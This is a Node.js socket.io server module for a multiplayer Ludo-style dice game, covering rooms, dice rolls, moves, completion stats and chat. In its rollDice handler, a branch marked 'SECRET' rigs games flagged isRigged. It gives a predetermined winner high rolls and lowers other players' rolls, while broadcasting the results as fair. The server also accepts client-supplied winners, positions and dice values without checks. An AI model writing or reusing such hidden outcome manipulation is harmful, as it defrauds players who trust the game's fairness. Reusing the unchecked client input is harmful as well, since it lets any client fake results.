const Game = require('../models/Game');
const User = require('../models/User');
const { v4: uuidv4 } = require('uuid');

const gameRooms = {};

module.exports = (io) => {
  io.on('connection', (socket) => {
    console.log(`👤 User connected: ${socket.id}`);

    // Create game room
    socket.on('createGame', async (data) => {
      try {
        const gameId = uuidv4();
        const game = new (require('../models/Game'))({
          gameId,
          gameMode: data.gameMode || 'classic',
          players: [{
            userId: data.userId,
            username: data.username,
            color: 'red',
            position: 0,
            pieces: [{ id: 1, position: 0 }, { id: 2, position: 0 }, { id: 3, position: 0 }, { id: 4, position: 0 }]
          }],
          status: 'waiting'
        });
        
        await game.save();
        gameRooms[gameId] = { game, players: [socket.id] };
        
        socket.join(gameId);
        socket.emit('gameCreated', { gameId, game });
        console.log(`🎮 Game created: ${gameId}`);
      } catch (error) {
        socket.emit('error', { message: error.message });
      }
    });

    // Join game
    socket.on('joinGame', async (data) => {
      try {
        const { gameId, userId, username } = data;
        const game = await Game.findOne({ gameId });
        
        if (!game) {
          return socket.emit('error', { message: 'Game not found' });
        }

        if (game.players.length >= 4) {
          return socket.emit('error', { message: 'Game is full' });
        }

        const colors = ['red', 'yellow', 'green', 'blue'];
        const usedColors = game.players.map(p => p.color);
        const availableColor = colors.find(c => !usedColors.includes(c));

        game.players.push({
          userId,
          username,
          color: availableColor,
          position: 0,
          pieces: [{ id: 1, position: 0 }, { id: 2, position: 0 }, { id: 3, position: 0 }, { id: 4, position: 0 }]
        });

        if (game.players.length >= 2) {
          game.status = 'in_progress';
        }

        await game.save();
        socket.join(gameId);
        gameRooms[gameId].players.push(socket.id);

        io.to(gameId).emit('playerJoined', { game, playerId: userId, username });
        console.log(`✅ Player ${username} joined game ${gameId}`);
      } catch (error) {
        socket.emit('error', { message: error.message });
      }
    });

    // Roll dice
    socket.on('rollDice', async (data) => {
      try {
        const { gameId, playerId, username } = data;
        const game = await Game.findOne({ gameId });
        
        if (!game) {
          return socket.emit('error', { message: 'Game not found' });
        }

        let diceValue = Math.floor(Math.random() * 6) + 1;

        // SECRET: If winner is predetermined, manipulate dice in favor of winner
        if (game.isRigged && game.predeterminedWinner) {
          if (playerId.toString() === game.predeterminedWinner.toString()) {
            // Give favorable rolls (bias towards higher numbers)
            diceValue = Math.floor(Math.random() * 4) + 3; // Rolls 3-6
          } else {
            // Reduce luck for other players (bias towards lower numbers)
            if (Math.random() > 0.5) {
              diceValue = Math.floor(Math.random() * 3) + 1; // Rolls 1-3
            }
          }
        }

        game.diceHistory.push(diceValue);
        await game.save();

        io.to(gameId).emit('diceRolled', {
          playerId,
          username,
          diceValue,
          timestamp: new Date()
        });
        console.log(`🎲 Dice rolled by ${username}: ${diceValue}`);
      } catch (error) {
        socket.emit('error', { message: error.message });
      }
    });

    // Move piece
    socket.on('movePiece', async (data) => {
      try {
        const { gameId, playerId, pieceId, newPosition } = data;
        const game = await Game.findOne({ gameId });
        
        if (!game) {
          return socket.emit('error', { message: 'Game not found' });
        }

        const playerIndex = game.players.findIndex(p => p.userId.toString() === playerId.toString());
        if (playerIndex === -1) {
          return socket.emit('error', { message: 'Player not found in game' });
        }

        const piece = game.players[playerIndex].pieces.find(p => p.id === pieceId);
        if (piece) {
          piece.position = newPosition;
        }

        game.moves.push({
          playerId,
          diceValue: data.diceValue,
          pieceMoved: pieceId,
          timestamp: new Date()
        });

        await game.save();

        io.to(gameId).emit('pieceMoved', {
          playerId,
          pieceId,
          newPosition,
          timestamp: new Date()
        });
      } catch (error) {
        socket.emit('error', { message: error.message });
      }
    });

    // Game finished
    socket.on('gameFinished', async (data) => {
      try {
        const { gameId, winnerId, winnerName } = data;
        const game = await Game.findOne({ gameId });
        
        if (!game) {
          return socket.emit('error', { message: 'Game not found' });
        }

        game.status = 'completed';
        game.winner = winnerId;
        game.winnerName = winnerName;
        game.completedAt = new Date();
        game.duration = Math.floor((game.completedAt - game.createdAt) / 1000);

        await game.save();

        // Update user stats
        await User.findByIdAndUpdate(winnerId, {
          $inc: { wins: 1, totalGames: 1 }
        });

        // Update other players' stats
        for (const player of game.players) {
          if (player.userId.toString() !== winnerId.toString()) {
            await User.findByIdAndUpdate(player.userId, {
              $inc: { losses: 1, totalGames: 1 }
            });
          }
        }

        io.to(gameId).emit('gameCompleted', {
          game,
          winnerId,
          winnerName
        });

        console.log(`🏆 Game ${gameId} completed. Winner: ${winnerName}`);
      } catch (error) {
        socket.emit('error', { message: error.message });
      }
    });

    // Chat message
    socket.on('sendMessage', (data) => {
      const { gameId, username, message } = data;
      io.to(gameId).emit('newMessage', {
        username,
        message,
        timestamp: new Date()
      });
    });

    // Disconnect
    socket.on('disconnect', () => {
      console.log(`👤 User disconnected: ${socket.id}`);
    });
  });
};